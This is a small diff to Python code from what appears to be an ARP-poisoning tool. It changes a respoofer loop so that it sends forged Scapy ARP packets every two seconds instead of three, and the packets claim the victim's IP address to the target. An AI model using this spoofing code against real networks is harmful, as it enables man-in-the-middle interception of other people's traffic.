@@ -74,13 +74,13 @@ class arp(Poison):
 		return self.victim[0]
 			
 	def respoofer(self, target, victim):
-		""" Respoof the target every three seconds.
+		""" Respoof the target every two seconds.
 		"""
 		try:
 			pkt = Ether(dst=target[1],src=self.local[1])/ARP(op="who-has",psrc=victim[0], pdst=target[0])
 			while self.spoofing:
 				sendp(pkt, iface_hint=target[0])
-				time.sleep(3)
+				time.sleep(2)
 		except Exception, j:
 			Error('Spoofer error: %s'%j)
 			return None
